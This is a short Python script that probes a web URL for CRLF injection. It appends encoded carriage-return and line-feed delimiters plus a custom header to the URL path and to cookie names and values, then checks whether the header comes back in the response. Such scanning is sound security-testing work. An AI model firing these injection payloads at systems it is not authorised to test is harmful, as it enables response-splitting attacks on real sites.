from pprint import pprint

import requests

header = 'CustomHeader'
fullheader = 'CustomHeader: Value'


def build_payoad():
    """
    Just build payload list
    :return:
    """
    delimiters = ['%0d', '%0a', '%0d%0a', '%00%0d', '%00%0a', '%00%0d%0a',]
    return [delimiter + fullheader for delimiter in delimiters]


def check(url):
    """
    Payload found in response
    :param url:
    :return:
    """
    try:
        for payload in build_payoad():
            # inject in url
            if header in requests.get(url + '/' + payload).headers.keys():
                return True
            # inject in name of cookie
            if header in requests.get(url, cookies={str(payload).encode('utf-8'): 'kek'}).headers.keys():
                return True
            # inject in value of cookie
            if header in requests.get(url, cookies={'kek': payload}).headers.keys():
                return True
    except Exception as ex:
        pprint(ex)
    return False
